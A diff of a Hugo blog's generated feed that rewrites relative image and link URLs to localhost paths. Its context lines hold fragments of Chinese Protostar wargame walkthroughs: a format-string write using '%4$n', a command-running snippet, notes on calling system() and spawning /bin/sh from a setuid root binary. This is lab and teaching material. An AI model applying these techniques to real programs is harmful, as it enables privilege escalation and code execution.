-	srcset=&#34;/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/0_hu573bfdd6fd74ceed33d84ecfc0e1d14c_594434_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3725,7 +4689,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-one&#34;&gt;Format One&lt;/h2&gt;
-&lt;p&gt;由于比较奇怪所以放在了&lt;a class=&#34;link&#34; href=&#34;/p/protostar_format_1&#34; &gt;这里&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;由于比较奇怪所以放在了&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_format_1&#34; &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-two&#34;&gt;Format Two&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -3777,10 +4741,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;li&gt;&lt;code&gt;%60x&lt;/code&gt; 打印 60 个 bytes&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;%4$n&lt;/code&gt; 选取第 4 个参数（也就是上面说 ABCD 出现在第 4 个 &lt;code&gt;%08x&lt;/code&gt;）写入「当前打印了多少字符」&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/2.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/2.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;458&#34;
-	srcset=&#34;/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/2_hu03bb5063ddb10fbfba2ceaf63589f764_489315_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3860,10 +4824,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;END&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts command
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;command&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/3.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/3.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;492&#34;
-	srcset=&#34;/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/3_hu135c01da0de4037b090314729f3ce412_502022_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3973,10 +4937,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;所以只能换成 &lt;code&gt;system(command)&lt;/code&gt; 了&lt;/p&gt;
 &lt;p&gt;顺带一提 &lt;code&gt;puts `#{command}` &lt;/code&gt; 的 Markdown 语法是&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;``puts &lt;span style=&#34;color:#e6db74&#34;&gt;`#{command}`&lt;/span&gt; ``
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/4.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/4.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;888&#34;
-	srcset=&#34;/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_480x0_resize_box_3.png 480w, /p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_0-4/4_hu6fa83b70559595ac7c0fada6259c719b_867924_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3989,10 +4953,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>Protostar Stack 0-7 Walkthrough</title>
-        <link>/p/protostar_stack_4-7/</link>
+        <link>//localhost:1313/p/protostar_stack_4-7/</link>
         <pubDate>Tue, 22 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_stack_4-7/</guid>
+        <guid>//localhost:1313/p/protostar_stack_4-7/</guid>
         <description>&lt;p&gt;所有的 python 脚本已经放在了&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -4098,7 +5062,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;23461&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; stack7
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h2 id=&#34;stack-zero--three&#34;&gt;Stack Zero ~ Three&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_stack_0-3&#34; &gt;☞ 为了避免太长就被隐藏在这里了x&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_stack_0-3&#34; &gt;☞ 为了避免太长就被隐藏在这里了x&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;stack-four&#34;&gt;Stack Four&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -4588,10 +5552,10 @@ $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ecffb0 &amp;lt;__libc_sy
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;为什么就没有了呢，怎么会是呢&lt;/p&gt;
 &lt;p&gt;实际上确实已经有一个 &lt;code&gt;/bin/sh&lt;/code&gt; 生成了，可是还什么都没输入就退出了&lt;/p&gt;
 &lt;p&gt;这时候可以使用 cat&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_stack_4-7/cat.jpeg&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_stack_4-7/cat.jpeg&#34;
 	width=&#34;201&#34;
 	height=&#34;251&#34;
-	srcset=&#34;/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_480x0_resize_q75_box.jpeg 480w, /p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_1024x0_resize_q75_box.jpeg 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_480x0_resize_q75_box.jpeg 480w, //localhost:1313/p/protostar_stack_4-7/cat_huf5a7df82de7ce9c5e750105a941d68d1_9536_1024x0_resize_q75_box.jpeg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
